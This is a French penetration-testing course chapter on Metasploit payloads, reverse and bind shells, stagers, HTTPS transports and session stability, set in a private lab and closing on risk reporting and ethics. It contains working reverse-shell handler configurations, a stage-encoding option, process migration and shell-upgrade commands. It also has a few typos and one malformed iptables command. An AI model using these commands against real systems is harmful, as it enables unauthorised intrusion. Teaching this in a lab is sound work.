+Un dernier point sur cette séquence, qui prépare la partie suivante. Ce que la console appelle session n'est pas un objet unique : c'est le canal de communication établi par la charge utile, et ses propriétés dépendent entièrement de cette charge. Un simple shell exécutera des commandes et rien d'autre ; une session plus riche offrira des modules dédiés, des canaux multiples et des capacités de reconnaissance interne. La nature de cette session se décide au moment du choix du payload, avant le lancement, et c'est précisément l'objet de la prochaine partie.
+
+## Payloads : ce que vous déposez après l'exploit
+
+Le terme payload désigne le code qui s'exécute sur la cible une fois le déclenchement réussi. Il faut enlever dès maintenant une idée reçue très répandue : le payload n'est pas synonyme de shell. Un shell en est une forme, la plus ancienne et la plus simple, mais le payload peut aussi être un client de gestion à distance, un module chargé en mémoire, un script d'ouverture de session ou même une charge utile qui ne fait qu'ouvrir un canal et attendre la suite. Tout ce que vous ferez après l'accès initial dépend de ce choix, et il se prend avec la commande set PAYLOAD ou avec show payloads avant le lancement.
+
+Les payloads se classent d'abord par plateforme et par architecture : un payload unix n'exécutera pas sous Windows, un payload 64 bits plantera sur une cible en 32 bits, et un payload conçu pour un service réseau ne convient pas à un processus en mémoire. La commande show payloads applique un filtre automatique en fonction du module et de la cible déclarée, mais elle ne vérifie pas l'architecture réelle : c'est à vous de relever cette information pendant la reconnaissance, avec le scan de services ou avec un module auxiliaire de détection d'exploitation.
+
+Les payloads se classent ensuite par canal de récupération. La famille cmd ou ordre de commande produit une session brute, dans laquelle vous tapez des commandes shell et recevez du texte : c'est le plus petit des payloads, le plus susceptible de fonctionner quand l'espace est limité, et le plus pauvre une fois dedans. La famille shell ouvre un interpréteur complet, avec un contexte d'environnement, ce qui améliore nettement le confort. La famille meterpreter fournit un client riche, chargé en mémoire, qui parle par canaux, expose des commandes structurées et permet de faire évoluer la session sans redémarrer la cible. Enfin, des payloads dédiés ouvrent une session dans un terminal ou dans un gestionnaire de fenêtres, ce qui est utile quand l'objectif est de montrer un accès graphique plutôt qu'un accès console.
+
+```bash
+# explorer les charges utiles compatibles avec un module choisi
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 > show payloads
+msf6 > set PAYLOAD cmd/unix/reverse
+msf6 > show options
+# une charge utile unique n'a pas d'options de transport particulieres,
+# mais une charge utile riche en affichera beaucoup : LHOST, LPORT, UUID...
+```
+
+Le tableau suivant confronte les grandes familles selon trois critères qui décident réellement de votre choix : la taille de la charge, la qualité de la session obtenue et la discrétion du trafic.
+
+```table
+| Famille de payload | Taille | Session obtenue | Trafic généré |
+| --- | --- | --- | --- |
+| cmd unix ou windows | Très faible | Commandes brutes, texte brut | Direct, peu volumineux |
+| shell interactif | Faible | Interpréteur complet | Direct, un flux continu |
+| session riche en mémoire | Moyenne à élevée | Canaux multiples, commandes dédiées | Selon le transport choisi |
+| payload de type script | Variable | Dépend de l'interpréteur disponible | Souvent en plusieurs messages |
+```
+
+Une notion reste à clarifier avant de passer aux shells : la différence entre charge utile unique et charge utile étagée. Une charge utile unique contient tout, elle s'exécute d'un bloc et ne dépend de rien d'autre ; elle est donc plus volumineuse, mais elle ne génère qu'une seule connexion. Une charge utile étagée, elle, se compose d'un petit amorçage qui sert à récupérer la partie principale, et cette distinction est au cœur de la section suivante. Dans la console, elle se repère au nommage : un identifiant court se termine généralement par une référence au transport, tandis qu'un identifiant long et explicite désigne le plus souvent l'ensemble en un seul morceau.
+
+Le piège le plus fréquent, enfin, consiste à choisir un payload sans regarder ce qu'il exige de la cible. Une charge utile qui doit s'exécuter dans un service limité échouera si elle demande trop d'espace ; une charge utile qui s'attache à un processus éphémère donnera une session qui meurt à la fin de la requête ; une charge utile qui ouvre un port entrant échouera derrière un filtre qui n'autorise que les connexions sortantes. Le bon réflexe est de formuler, avant le lancement, une phrase en trois temps : ce que la charge utile ouvre, ce dont la cible a besoin pour l'accueillir, et ce qui se passe si l'une des deux conditions manque. Cette phrase, vous la noterez dans votre carnet, et c'est elle qui vous évitera de conclure trop vite à une vulnérabilité réelle lorsque l'explication tenait dans un simple détail de configuration.
+
+Une fois le payload choisi, la question devient très concrète : qui appelle qui, sur quel port, avec quel comportement si le réseau se met en travers. Cette troisième partie traite des deux formes de shell que vous rencontrerez partout, des petits amorçages qui servent à livrer la charge utile principale, du choix d'une couche de transport, et enfin de la stabilité, c'est-à-dire de l'art de garder une session ouverte le temps de faire quelque chose d'utile. C'est la partie la plus technique de la leçon, et aussi celle qui sépare une démonstration qui échoue après quinze secondes d'un travail d'exploitation réellement exploitable.
+
+Le fil conducteur est simple : chaque choix que vous prenez ici — direction de la connexion, transport, couche de session — déplace une contrainte d'un endroit à un autre. Rien n'est gratuit, rien n'est universel, et une configuration parfaite pour un lab avec des adresses fixes ne survivra pas à un réseau filtré. Nous restons dans le lab-off3, où tout est vérifiable à volonté, et les filtrages du monde réel sont simulés par des règles que vous posez vous-même sur vos propres machines.
+
+## Reverse shell ou bind shell : qui appelle qui, et pourquoi
+
+Un shell n'est, à l'essentiel, qu'un circuit : d'un côté un programme qui lit des commandes sur une entrée et écrit les résultats sur une sortie, de l'autre un canal réseau qui relie cette entrée-sortie à votre clavier et à votre écran. La seule question est celle du sens de la connexion réseau, et elle admet deux réponses. Dans un reverse shell, c'est la machine compromise qui initie la connexion vers votre écouteur : elle vous rappelle. Dans un bind shell, c'est elle qui ouvre un port en écoute et qui attend que vous vous y connectiez : elle vous attend. Tout le reste de cette section découle de cette différence.
+
+```text
+# reverse shell : la cible initie la connexion
+   cible 192.168.56.20                      machine d'attaque 192.168.56.10
+   +------------------+   connexion sortante   +---------------------------+
+   | charge utile     | =====================> | ecouteur (handler ou nc)  |
+   | executee en      |   du port 4444         | recoit commandes et       |
+   | memoire ou       | <===================== | renvoie les resultats     |
+   | service exploite |   flux bidirectionnel  |                           |
+   +------------------+                        +---------------------------+
+
+# bind shell : la cible attend la connexion
+   cible 192.168.56.20                      machine d'attaque 192.168.56.10
+   +------------------+   connexion entrante   +---------------------------+
+   | charge utile     | <===================== | client (nc ou connect)    |
+   | ouvre un port    |   du port 4444         | envoie les commandes      |
+   | et accepte       | =====================> | et lit les resultats      |
+   | les commandes    |   flux bidirectionnel  |                           |
+   +------------------+                        +---------------------------+
+```
+
+Le choix entre les deux n'est pas une préférence, il découle des filtrages en présence. Si la cible ne peut pas être atteinte de l'extérieur, parce qu'elle se trouve derrière une NAT ou devant une règle qui refuse les connexions entrantes, le bind shell est impossible et il ne reste que le reverse shell. Si la cible, inversement, ne peut pas émettre de connexions vers des adresses inconnues, parce qu'un filtrage sortant est en place, c'est le reverse shell qui échoue et le bind shell qui devient la seule option. Dans un lab, vous pouvez fabriquer les deux situations en une minute, et c'est exactement ce que nous allons faire, car comprendre une contrainte qu'on a soi-même posée est incomparablement plus formateur que la lire dans un tableau.
+
+```bash
+# sur linux-target1 : simuler un filtrage sortant strict
+sudo iptables -A OUTPUT -p tcp --dport 4444 -j DROP
+sudo iptables -L OUTPUT -n --line-numbers
+# un reverse shell vers le port 4444 echoue desormais :
+# la charge utile est executee, mais la connexion ne sort jamais.
+# pour revenir a lab-off3, annulez la regle :
+sudo iptables -D OUTPUT -1
+```
+
+Ce petit exercice produit un symptôme très instructif : la console affiche que le gestionnaire écoute, aucun message d'erreur n'apparaît, et pourtant aucune session ne s'ouvre. La faille a été déclenchée et la charge utile s'est exécutée ; c'est le canal qui n'existe pas. Beaucoup de praticiens débutants passent alors une heure à changer de module, alors que le diagnostic correct tient en une commande de vérification du trafic, à mener depuis la machine d'attaque ou depuis le poste hôte.
+
+L'écouteur, côté machine d'attaque, se prépare de deux manières. La plus simple est un outil de base de type netcat lancé en écoute sur le port choisi, qui convient parfaitement quand la charge utile envoie une commande shell brute. La plus robuste est le gestionnaire du framework, qui connaît la charge utile attendue, gère plusieurs sessions, réessaie en cas d'échec et ouvre directement une session structurée dans la console. Dans le lab-off3, nous privilégions systématiquement le gestionnaire, pour une raison pédagogique : il vous oblige à aligner payload et écouteur, ce qui est la cause n°1 des sessions qui ne s'ouvrent jamais.
+
+```bash
+# ecouteur minimal, pour une charge utile de type commande shell
+nc -lvnp 4444
+# depuis une autre fenetre, lancer l'exploitation vers 192.168.56.10:4444
+# enfin, dans msfconsole, preferer le gestionnaire qui connait la charge :
+msf6 > use exploit/multi/handler
+msf6 > set PAYLOAD cmd/unix/reverse
+msf6 > set LHOST 192.168.56.10
+msf6 > set LPORT 4444
+msf6 > set ExitOnSession false
+msf6 > run -j
+```
+
+La capture réseau ci-dessous montre à quoi ressemble l'observation de ces échanges depuis la machine d'attaque : les adresses source et destination, les ports et l'ordre des paquets suffisent à déterminer qui a initié la connexion, et donc à savoir si vous êtes devant un reverse shell ou devant un bind shell. Prise avant et après chaque tentative, elle vous épargnera des diagnostics erronés.
+
+```image
+https://upload.wikimedia.org/wikipedia/commons/thumb/c/cf/Wireshark_3.6_screenshot.png/960px-Wireshark_3.6_screenshot.png
+| Interface d'analyseur réseau affichant une capture de paquets, avec les adresses et ports source et destination permettant d'établir le sens d'une connexion.
+```
+
+Le tableau suivant condamme les deux options face à face, avec la situation dans laquelle chacune s'impose et le point de vigilance qui l'accompagne.
+
+```table
+| Critère | Reverse shell | Bind shell |
+| --- | --- | --- |
+| Qui initie la connexion | La machine compromise | La machine d'attaque |
+| Filtrage entrant sur la cible | Indifférent | Bloquant |
+| Filtrage sortant sur la cible | Bloquant | Indifférent |
+| Accessibilité derrière une NAT | Possible si sortie autorisée | Impossible sans redirection |
+| Configuration de l'écouteur | Indispensable avant le lancement | Port ouvert sur la cible |
+| Détection la plus courante | Connexion sortante vers un hôte inconnu | Port inattendu en écoute |
+```
+
+Trois pièges reviennent constamment sur cette question. Le premier est l'ordre des opérations : l'écouteur doit être prêt avant le lancement, sinon la cible tente une connexion qui échoue et, selon la charge utile, ne réessaie pas. Le deuxième est l'adresse d'écoute : sur un lab multi-cartes, laisser l'écouteur sur l'adresse de bouclage alors que la charge utile vise l'adresse host-only produit un échec parfaitement silencieux. Le troisième concerne les variantes d'outils : plusieurs netcat coexistent, avec des syntaxes différentes pour l'option de port, et il faut vérifier la vôtre avant de conclure que le problème vient d'ailleurs.
+
+## Stagers et couches : la livraison de la charge utile en plusieurs temps
+
+La charge utile n'arrive presque jamais en un seul bloc, et cette mécanique de livraison est ce que la littérature appelle les stagers. Un stager est un très petit amorce, parfois de quelques dizaines d'octets, dont le seul rôle est d'ouvrir un canal et de récupérer la suite. La suite, appelée stage, est la charge utile complète, nettement plus volumineuse, qui prend le relais une fois téléchargée. Une charge utile unique, elle, embarque tout dès le départ et ne se sert de rien d'autre.
+
+Cette séparation existe pour une raison historique et technique très concrète : à certains endroits, l'espace disponible pour injecter du code est minuscule. Plutôt que de réduire indéfiniment la fonctionnalité, on injecte un petit amorçage, qui récupère le reste par la connexion déjà établie. Dans la console, la distinction se lit dans les noms : une charge utile dont l'identifiant se termine par une référence à un transport est généralement un stager, tandis qu'un identifiant long, explicite et souvent séparé par des tirets bas désigne le plus souvent une charge unique. La commande show options tranche dans tous les cas, car un stager expose les options de transport, et une charge unique, elle, expose surtout les options de comportement.
+
+```text
+# sequence de livraison en plusieurs temps
+1. le module declenche la faille et execute le STAGER (tres petit)
+2. le stager ouvre un canal vers LHOST:LPORT sur la machine d'attaque
+3. le stager demande le STAGE au gestionnaire en charge de la livraison
+4. le gestionnaire envoie la charge complete, souvent en morceaux
+5. le stage prend la main et la session s'ouvre dans la console
+# variante en un seul morceau :
+1. le module declenche la faille
+2. la charge complete s'execute et ouvre directement le canal
+3. la session s'ouvre, sans echange supplementaire
+```
+
+Le choix d'une couche repose sur trois questions, et vous devez y répondre par écrit avant de configurer quoi que ce soit. La première est de savoir si la machine d'attaque est joignable depuis la cible, et à quelle adresse : c'est la valeur de LHOST, et elle doit appartenir au segment de travail. La seconde est de savoir quel trafic traverse réellement le chemin entre les deux machines, ce que vous vérifierez avec un scan et une capture plutôt qu'en supposant. La troisième est de savoir quelle qualité de session vous devez obtenir, une commande brute suffisant parfois pour une preuve de concept, une session riche étant nécessaire pour tout ce qui touche à l'exploration.
+
+À partir de ces trois réponses, les transports disponibles se départilent sans difficulté. Le transport TCP direct est le plus simple : un seul port, un flux continu, aucune enveloppe, ce qui le rend rapide à mettre en place et facile à observer, mais également le plus visible et le plus vulnérable à un filtrage sortant. Les transports de type HTTP ou HTTPS enveloppent les échanges dans des requêtes web, ce qui leur permet de franchir des filtrages qui n'autorisent que le trafic web, de reprendre après une coupure courte et de se fondre dans le trafic ordinaire ; en contrepartie, ils sont plus lents, plus bavards et demandent une configuration soignée de l'agent utilisateur et de l'adresse de requête.
+
+```bash
+# configurer un canal de type web dans le lab-off3
+msf6 > use exploit/multi/handler
+msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
+msf6 > set LHOST 192.168.56.10
+msf6 > set LPORT 8443
+msf6 > set HttpUserAgent "Mozilla/5.0 (compatible; lab-off3)"
+msf6 > set HttpURI labcheck
+msf6 > set EnableStageEncoding true
+msf6 > set StageEncoder x64/xor_dynamic
+msf6 > set ExitOnSession false
+msf6 > run -j
+```
+
+Les options que vous venez de voir méritent d'être comprises une par une, car elles reviendront dans toutes vos configurations. L'agent utilisateur détermine l'apparence de la requête côté réseau ; l'adresse de requête détermine le chemin demandé et doit correspondre exactement à ce que le gestionnaire attend, sous peine de renvoyer une page d'erreur à la place de la charge. L'encodage de l'étape, enfin, fait transiter le stage sous une forme modifiée, puisqu'il est réassemblé et décodé sur la cible : c'est une précaution de forme, pas une garantie, et il ne faut jamais la présenter comme une protection.
+
+```table
+| Couche | Avantage principal | Inconvénient principal | Quand la choisir dans le lab |
+| --- | --- | --- | --- |
+| TCP direct | Simplicité et rapidité | Très visible, bloqué par un filtrage sortant | Réseau de lab ouvert, apprentissage |
+| HTTP | Traverse les filtrages web | Plus lent, requêtes reconnaissables | Quand seul le trafic web passe |
+| HTTPS | Mêmes avantages avec chiffrement | Certificat, diagnostic plus difficile | Quand le trafic web chiffré est admis |
+| Transport peu commun | Discrétion relative | Fragilité et maintenance limitées | Jamais pour débuter un exercice |
+```
+
+Le point le plus important de cette section est l'alignement entre la charge utile et le gestionnaire. Un stager qui s'attend à recevoir une étape ne peut pas dialoguer avec un gestionnaire configuré pour une charge unique, et l'inverse produit une session qui s'ouvre puis s'effondre, faute de pouvoir se déployer. La règle tient en trois vérifications avant le lancement : l'identifiant du payload est le même des deux côtés, l'adresse et le port d'écoute sont identiques, et la variable globale éventuellement définie précédemment a bien été effacée. Un simple show options avant chaque exploitation suffit à vérifier les trois points.
+
+Un dernier piège concerne la réutilisation des ports. Chaque lancement échoué peut laisser un écouteur en arrière-plan, et un port encore occupé fera échouer le suivant avec un message qui ne mentionne pas le vrai problème. Après chaque tentative, appelez jobs pour lister les tâches, tuez celles qui sont devenues inutiles, puis relancez. Cette hygiène, enlevée une minute par séance, vous en fait gagner vingt quand le diagnostic part dans la mauvaise direction.
+
+## Stabilité d'un shell : survivre aux premières heures
+
+Obtenir une session est un exploit ; la conserver assez longtemps pour en tirer quelque chose en est un autre. La stabilité n'est pas un confort, c'est une condition de travail : une session qui meurt pendant une commande vous fait perdre le contexte, les résultats intermédiaires et souvent la trace de ce que vous étiez en train de démontrer. Nous examinons ici les causes réelles de décès des sessions, les gestes qui les préviennent et la manière de diagnostiquer une session qui rame.
+
+Les causes sont plus ordinaires qu'on ne le croit. Une charge utile attachée à un processus éphémère disparaît quand ce processus se termine, typiquement à la fin d'une requête web. Un redémarrage, une mise en veille ou un changement de réseau de la machine hôte coupe le canal sans prévenir. Une interruption clavier envoyée par erreur dans la console se propage à la session et termine le processus. Un terminal mal dimensionné, une locale inadéquate ou un encodage de caractères absent rendent la session inutilisable sans pour autant l'avoir tuée. Enfin, un filtrage qui coupe les connexions longues laisse la session s'afficher comme active alors qu'elle est déjà morte.
+
+Le premier réflexe est structurel : ne jamais travailler avec l'écouteur comme processus d'un terminal que vous pourriez refermer. Lancez le gestionnaire en tâche de fond dans la console, avec l'option -j, et faites tourner la console elle-même dans un multiplexeur de terminal ou dans une session détachée. Un poste hôte qui se met en veille, une fenêtre fermée par mégarde ou une mise à jour du poste qui redémarre sont les trois causes les plus fréquentes de perte de session, et toutes trois relèvent de cette seule précaution.
+
+```bash
+# proteger l'ecouteur et la console contre la refermeture d'une fenetre
+tmux new -s lab-off3
+msfconsole -q
+# puis, dans la console, lancer en tache de fond et detacher la session
+msf6 > exploit -j
+msf6 > background
+# reverifier apres chaque tentative : jobs pour les ecouteurs, sessions pour les canaux
+msf6 > jobs
+msf6 > sessions -l
+```
+
+Le deuxième réflexe concerne la qualité de la session brute. Un shell obtenu par une charge minimale n'a ni terminal, ni historique, ni taille de fenêtre correcte : les programmes interactifs s'affichent en vrac, les flèches du clavier sont interprétées comme des caractères bruts et le défilement devient confus. On lui donne un vrai terminal en plusieurs étapes, d'abord sur la cible avec un interpréteur de commande dédié, puis sur la machine d'attaque en alignant la taille et la variable d'environnement. L'opération est une routine standard dans le métier, et elle se déroule toujours dans le même ordre.
+
+```text
+# donner un vrai terminal a un shell brut (depuis la session ouverte)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# puis, sans fermer la session : Ctrl+Z pour arreter le processus local
+# sur la machine d'attaque :
+stty raw -echo
+fg
+# enfin, sur la cible, aligner la taille et l'environnement :
+stty rows 40 columns 120
+export TERM=xterm-256color
+export LANG=C.UTF-8
+reset
+```
+
+Le troisième réflexe consiste à rendre la session résistante à la mort du processus qui la porte. Deux techniques suffisent dans la majorité des cas. La première consiste à faire migrer la session vers un processus stable dès son ouverture, ce que le gestionnaire sait faire automatiquement si vous lui en donnez l'ordre. La seconde consiste, sur une session de type commande, à la convertir en une session plus riche, capable de survivre à un terminal fermé et de poursuivre son travail. Dans les deux cas, la configuration se fait avant le lancement, car une session déjà ouverte ne se stabilise pas rétroactivement.
+
+```bash
+# avant le lancement : demander la migration automatique des sessions
+msf6 > set AutoRunScript migrate -f
+msf6 > set ExitOnSession false
+msf6 > exploit -j
+# apres coup, sur une session brute deja ouverte :
+msf6 > sessions -u 1
+msf6 > use post/multi/manage/shell_to_meterpreter
+msf6 > set SESSION 1
+msf6 > set LHOST 192.168.56.10
+msf6 > run
+```
+
+Il faut enfin savoir diagnostiquer une session qui rame ou qui semble figée, car les deux situations n'ont pas les mêmes causes. Une session lente mais vivante signale le plus souvent un transport peu adapté, une session totalement muette signale un canal coupé, et une session qui répond par intermittence signale un processus en fin de vie ou un filtrage qui détruit les connexions longues. La capture du trafic sur le segment tranche dans tous les cas : si des paquets continuent de circuler, le problème est côté interprétation ; s'ils cessent, le problème est réseau ; s'ils ne sont jamais partis, le problème est la configuration de l'écouteur.
+
+```table
+| Symptôme observé | Cause probable | Geste correcteur |
+| --- | --- | --- |
+| Session morte après la première commande | Processus éphémère porteur de la charge | Migration automatique dès l'ouverture |
+| Caractères bizarres et affichage éclaté | Terminal brut et taille non alignée | Interpréteur dédié puis alignement |
+| Session figée après veille du poste | Canal réseau interrompu | Console dans un multiplexeur, puis relance |
+| Session qui répond au bout de plusieurs secondes | Transport peu adapté au chemin | Basculer vers une couche plus résistante |
+| Rien ne s'affiche mais des paquets circulent | Problème d'encodage ou de locale | Variables d'environnement réalignées |
+| Échec au deuxième lancement | Écouteur oublié en tâche de fond | jobs, nettoyage, puis relance |
+```
+
+Un mot pour finir sur la documentation de ces incidents. Notez, chaque fois qu'une session tombe, l'heure, la commande en cours, le transport utilisé et l'état du réseau au moment précis. Ces quelques lignes, prises sur le moment, constituent la matière première de la section suivante : elles sont ce qui vous permettra de distinguer une faille de votre chaîne d'exploitation d'un défaut de votre laboratoire, et cette distinction est exactement ce qu'un décideur attend de vous quand vous présenterez vos conclusions.
+
+La technique ne vaut que par le compte que vous en rendez. Cette dernière partie traite de ce qui distingue un exercice réussi d'un résultat défendable : l'évaluation honnête d'un risque, les limites éthiques que vous ne franchirez pas, et la manière de sauvegarder, de reprendre et de documenter un laboratoire pour qu'il reste utile au-delà de la séance. Ces trois sujets ont une réputation de supplément d'âme ; ils sont en réalité la moitié du métier, et c'est généralement sur eux que se joue la crédibilité d'un rapport.
+
+La suite s'appuie toujours sur le lab-off3. Les cas cités sont des situations de laboratoire, et les précautions décrites concernent la manière de rendre compte, jamais la manière d'agir sur un système qui ne vous appartient pas. À mesure que vous avancerez, gardez à l'esprit que chaque conclusion que vous écrirez devra pouvoir être relue par une personne qui n'était pas présente, et éventuellement contestée par celle qui exploite le système que vous décrivez.
+
+## Évaluer honnêtement un risque : de la démonstration à la décision
+
+La première discipline consiste à séparer nettement trois niveaux, que la pratique courante confond sans cesse. Le premier est le constat : un service expose une version pour laquelle un module d'exploitation existe. Le second est la démonstration : dans votre laboratoire, sur une machine configurée d'une manière précise, ce module a ouvert une session. Le troisième est l'appréciation : vous estimez que cette capacité, si elle se reproduisait sur un système réel appartenant à un périmètre donné, exposerait une valeur donnée. Chacun de ces niveaux a sa preuve, sa portée et son degré de confiance, et un rapport honnête les expose séparément plutôt que de les fondre en une affirmation unique.
+
+La hiérarchie des preuves est simple à mémoriser. Un signalement automatique est une indication. Un scan manuel qui confirme la version est un constat vérifiable. Une exécution réussie dans le lab est une démonstration, limitée à la configuration testée. Une action concrète obtenue après la session, tel qu'un fichier lu ou un processus listé, renforce la démonstration, sans jamais l'étendre à un système que vous n'avez pas touché. À chaque niveau, vous devez pouvoir citer la commande, l'heure, la machine et le résultat brut ; à défaut, vous ne constatez pas, vous supposiez.
+
+Les conditions du laboratoire faussent systématiquement l'appréciation, et il faut le dire explicitement. Dans le lab-off3, la cible est non corrigée, l'antivirus est absent, les comptes sont faibles, le pare-feu est ouvert et le service tourne avec sa configuration par défaut. Un exploit qui réussit dans ces conditions ne vous dit rien de la difficulté qu'il rencontrerait ailleurs. Trois prérequis doivent donc être recherchés et documentés avant toute généralisation : l'accès réseau nécessaire, le niveau de privilèges requis et l'interaction éventuelle d'un utilisateur. Un module qui exige une session locale n'a pas la même portée qu'un module déclenchable à distance par n'importe quel hôte du segment.
+
+```text
+# formulation honnete d'un constat de laboratoire
+Constat     : le service de la cible linux-target1 expose une version antique
+              pour laquelle un module d'exploitation est disponible.
+Demonstration : dans le lab-off3, le module a ouvert une session commande en
+              3 essais sur 3, depuis kali-lab, sans identification prealable.
+Preconditions : acces direct au segment, service non corrige, aucun EDR,
+              configuration par defaut.
+Non etabli  : le comportement sur un systeme corrige, durci, ou protege par un
+              outil de detection ; la reproductibilite depuis un autre segment.
+Confiance   : haute pour le lab, nulle pour tout autre perimetre.
+Recommandation : verifier la version reelle en production, puis appliquer le
+              correctif fourni par l'editeur et retester.
+```
+
+Le tableau ci-dessous applique cette méthode à trois situations de laboratoire, en montrant ce qui est établi, ce qui reste hypothétique et la décision que l'on peut en tirer.
+
+```table
+| Situation dans le lab | Ce qui est établi | Ce qui reste hypothétique | Décision possible |
+| --- | --- | --- | --- |
+| Module d'exploitation réussi trois fois sur trois | La version et la configuration du lab permettent la session | La même version en production, corrigée ou non | Vérifier puis corriger |
+| Échec d'un module deux fois sur deux | Ce module ne fonctionne pas sur cette configuration | L'absence totale de faille sur ce service | Essayer une autre approche avant de conclure |
+| Service ouvert mais non exploité | Le port et la version sont visibles depuis le segment | L'exploitabilité réelle du service | Hiérarchiser, sans annoncer de faille |
+```
+
+Les indicateurs de sévérité, s'ils sont utiles, ne doivent jamais remplacer cette lecture. Un score de base décrit une propriété intrinsèque d'un défaut, indépendamment de votre environnement ; il ne dit rien de la valeur du système touché, de la probabilité réelle d'exploitation, ni du gain attendu par un attaquant. Une note élevée sur un service inaccessible depuis l'extérieur vaut moins, pour votre direction, qu'un défaut moyen sur un service exposé qui contient des données sensibles. L'erreur classique consiste à transmettre un score sans le contextualiser, en laissant le décideur croire qu'il s'agit d'une mesure du risque ; il s'agit d'une mesure d'un défaut, et l'écart entre les deux se comble par l'analyse.
+
+Une autre tentation mérite d'être nommée : celle du raccourci médiatique. Dire d'un système qu'il est compromis alors que vous avez obtenu une commande, annoncer une faille critique parce qu'un scanner l'a signalée, ou présenter une session de laboratoire comme une preuve d'intrusion réelle sont trois formulations que vous entendrez et que vous devrez refuser d'écrire. La formulation correcte est plus longue, plus lente et plus utile : elle décrit ce qui a été fait, sur quelle machine, dans quelles conditions, avec quel résultat, et elle énumère ce qui n'a pas été vérifié. Un rapport qui cite ses propres limites est cru plus facilement qu'un rapport qui n'en a pas.
+
+Enfin, l'évaluation honnête intègre les échecs. Une séance au cours de laquelle quatre modules sur cinq ont échoué contient une information : elle dit que la configuration réelle résiste à des approches standards éprouvées, ou que votre paramétrage comportait une erreur. Noter les échecs, avec leur cause identifiée, protège contre le biais du survivant qui fait que seules les réussites sont rapportées, et donne au lecteur une idée juste du niveau d'effort nécessaire. Dans le lab, c'est un exercice salutaire : pour chaque session obtenue, consignez également les tentatives infructueuses et la raison pour laquelle elles ont échoué.
+
+## Limites éthiques : la ligne que l'on ne franchit jamais
+
+Tout ce que vous avez appris dans ce chapitre n'a de sens que dans un environnement que vous contrôlez, avec une autorisation écrite et un périmètre défini. La compétence technique ne modifie pas ce cadre, elle le rend seulement plus nécessaire : plus vous savez faire, moins la tentation doit rester possible. Cette section décrit le cadre que nous appliquons dans le lab-off3, et que vous retrouverez dans toute mission professionnelle dûment mandatée.
+
+Le premier élément est l'autorisation. Elle est écrite, datée, signée, limitée dans le temps et nominative pour les personnes habilitées. Elle précise les machines visées, les plages d'adresses, les créneaux horaires, les actions autorisées, les actions interdites et le canal d'alerte en cas d'incident. Dans le lab, cette autorisation est interne et légère, mais elle existe : elle vous oblige à décrire le périmètre avant d'agir, ce qui est déjà l'essentiel. Une autorisation verbale n'est pas une autorisation ; un accord de principe qui ne cite pas les machines n'en est pas une non plus.
+
+Le deuxième élément est le périmètre, et il est matériel. Les adresses du réseau host-only, et ces adresses seules, sont visables. Les scans, les modules et les tentatives d'exploitation visent les seules machines listées dans votre plan d'adressage. Un test lancé « pour voir » contre une adresse que vous ne possédez pas reste un accès non autorisé à un système informatique, quelle que soit l'innocence du geste, et le droit de très nombreux pays le réprime précisément sous cet angle, indépendamment du dommage causé. Le fait que votre machine soit dans un laboratoire ne modifie rien : c'est l'adresse de destination qui décide.
+
+```text
+# carnet de perimetre — lab-off3, seance du 9 octobre 2026
+Perimetre autorise   : 192.168.56.0/24, interfaces host-only uniquement
+Machines visees      : kali-lab (.10), linux-target1 (.20), win10-lab (.30)
+Actions autorisees   : scan, exploitation, elevation, lecture des donnees du lab
+Actions interdites   : toute adresse hors plage, partage de dossiers hote,
+                       transmission de donnees reelles, persistence hors lab
+Createur             : vous, en qualite de responsable du laboratoire
+Relecture            : avant chaque nouvelle seance
+```
+
+Le troisième élément concerne les données. N'introduisez jamais de données réelles dans un laboratoire : ni listes de contacts, ni identifiants de production, ni documents d'entreprise, ni captures provenant d'un système tiers. Un lab contaminé par de vraies données devient un risque de fuite, et il perd du même coup sa qualité d'environnement maîtrisé. Utilisez des jeux de données factices, générez des comptes de test, et gardez une frontière nette entre l'environnement d'apprentissage et l'entreprise.
+
+Le quatrième élément est la proportionnalité même dans le lab. Déclencher une faille, obtenir une session, démontrer que vous pouvez lire un fichier : voilà ce qui est nécessaire. Effacer, modifier, exfiltrer, perturber ou mettre en place une persistance ne l'est jamais pour un exercice, et chaque geste de ce type doit être justifié par un objectif pédagogique explicite, noté avant d'être exécuté, puis annulé par un retour arrière. La sobriété n'est pas de la prudence : c'est la condition pour que votre démonstration reste lisible et réversible.
+
+```table
+| Situation | Statut | Conduite à tenir |
+| --- | --- | --- |
+| Exploiter une machine du lab-off3 | Autorisé | Faire, noter, puis revenir à l'état propre |
+| Scanner une adresse hors plan d'adressage | Interdit | Ne pas lancer, corriger le paramètre |
+| Tester un service sur le réseau de l'entreprise sans mandat | Interdit | Demander une autorisation écrite ou renoncer |
+| Importer un fichier de production dans le lab | Interdit | Générer un jeu de données factice |
+| Découvrir une faille dans un logiciel tiers | Signalable | Divulgation responsable, sans exploit public |
+```
+
+La divulgation responsable mérite d'être abordée, car elle se présente tôt ou tard. Si vos travaux de laboratoire mettent en évidence un défaut dans un logiciel que vous utilisez, le bon réflexe n'est pas de publier une exploitation, mais de contacter l'éditeur par le canal prévu à cet effet, de décrire le problème sans exploit fonctionnel, de fixer un délai raisonnable et de convenir d'une date de publication. Le but est que le correctif soit disponible avant que la connaissance du défaut ne serve à nuire. Cette démarche est la contrepartie obligée de la compétence que vous acquérez, et elle fait partie de votre formation au même titre que la manipulation de la console.
+
+Un mot sur l'usage pédagogique lui-même. Les techniques décrites dans ce chapitre n'ont de valeur que rapportées à vos propres machines ; leur enseignement vise à comprendre des mécanismes de défense, à tester des correctifs et à évaluer des configurations. Dès lors qu'un exercice ne peut être réalisé que contre une cible que vous ne possédez pas, ce n'est plus un exercice : c'est une action, et elle requiert un mandat. La règle tient en une question à se poser avant chaque commande, que vous poserez d'ailleurs à voix haute avec un collègue : est-ce que je possède cette machine, ou est-ce que quelqu'un m'a mandaté par écrit pour y intervenir ? Si la réponse est non, la commande ne part pas.
+
+Le travail à deux, enfin, vaut autant pour l'éthique que pour la technique. Devant une console, une personne qui tape et une personne qui lit le périmètre, relit les adresses et note l'heure produisent moins d'erreurs et moins de dérives. La seconde personne est aussi le garant du cadre : elle rappelle le périmètre, elle arrête une manipulation qui s'écarte de l'objectif et elle tient le journal qui, plus tard, prouvera que tout s'est déroulé dans les limites convenues. Ce dispositif simple coûte quelques minutes et vous évite les seules situations vraiment graves, celles où l'on s'en aperçoit trop tard.
+
+## Sauvegarder, reprendre et documenter le lab
+
